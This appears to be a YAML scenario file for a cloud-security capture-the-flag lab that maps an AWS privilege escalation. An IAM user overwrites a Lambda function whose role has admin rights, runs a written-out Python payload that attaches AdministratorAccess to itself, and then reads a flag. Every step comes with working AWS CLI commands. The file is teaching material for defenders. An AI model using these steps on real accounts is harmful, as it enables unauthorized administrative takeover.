attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-004-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has lambda:UpdateFunctionCode and lambda:InvokeFunction permissions
        on the target Lambda function, which executes with an administrative role.

    - id: target-lambda
      label: "Target Lambda"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-004-to-admin-target-lambda"
      description: >
        This Lambda function currently runs benign code. Its execution role has
        AdministratorAccess. By replacing its code with a malicious payload and
        immediately invoking it, the attacker can execute arbitrary operations with
        administrative privileges.

    - id: target-role
      label: "Admin Execution Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-004-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and is used as the Lambda execution role.
        When the malicious code runs inside the Lambda, it operates with full administrative
        privileges and attaches AdministratorAccess to the starting user — admin-equivalent
        permissions that are then used to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/lambda-004-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: target-lambda
      label: "lambda:UpdateFunctionCode"
      description: >
        Replace the Lambda function's existing code with a malicious Python payload
        that will attach AdministratorAccess to the starting user when invoked.
      hints:
        - "Fetch the existing function config with lambda:GetFunction to confirm the Handler field, then append your AttachUserPolicy call to the handler. The handler filename must match the existing Handler field exactly or the invocation will fail."
        - "Package as a zip and deploy with lambda:UpdateFunctionCode using the fileb:// prefix, then invoke with lambda:InvokeFunction using an empty payload. Lambda returns HTTP 200 even when the handler throws an exception -- always check the response body for errors. After a successful invocation, wait ~15 seconds for IAM policy propagation before verifying admin access."
        - "Browse to https://pathfinding.cloud/paths/lambda-004 for technique details."
      commands:
        - description: "List Lambda functions to find targets"
          command: "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table"
        - description: "Get current function details (handler name and execution role)"
          command: "aws lambda get-function --function-name pl-prod-lambda-004-to-admin-target-lambda"
        - description: "Create malicious Lambda payload"
          command: |
            cat > /tmp/lambda_function.py << 'EOF'
            import boto3

            def lambda_handler(event, context):
                iam = boto3.client('iam')
                iam.attach_user_policy(
                    UserName='pl-prod-lambda-004-to-admin-starting-user',
                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                )
                return {'statusCode': 200, 'body': 'Policy attached'}
            EOF
            cd /tmp && zip lambda_function.zip lambda_function.py && cd -
        - description: "Update the Lambda function code with the malicious payload"
          command: "aws lambda update-function-code --function-name pl-prod-lambda-004-to-admin-target-lambda --zip-file fileb:///tmp/lambda_function.zip"

    - from: target-lambda
      to: target-role
      label: "lambda:InvokeFunction"
      description: >
        Invoke the Lambda function to immediately execute the malicious payload under
        the administrative execution role, attaching AdministratorAccess to the starting user.
      hints: []
      commands:
        - description: "Invoke the Lambda function to execute the malicious payload"
          command: "aws lambda invoke --function-name pl-prod-lambda-004-to-admin-target-lambda --payload '{}' /tmp/response.json && cat /tmp/response.json"
        - description: "Verify administrator access was granted"
          command: "aws iam list-attached-user-policies --user-name pl-prod-lambda-004-to-admin-starting-user"
        - description: "Confirm admin access by listing IAM users"
          command: "aws iam list-users --max-items 3 --output table"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/lambda-004-to-admin --query 'Parameter.Value' --output text"
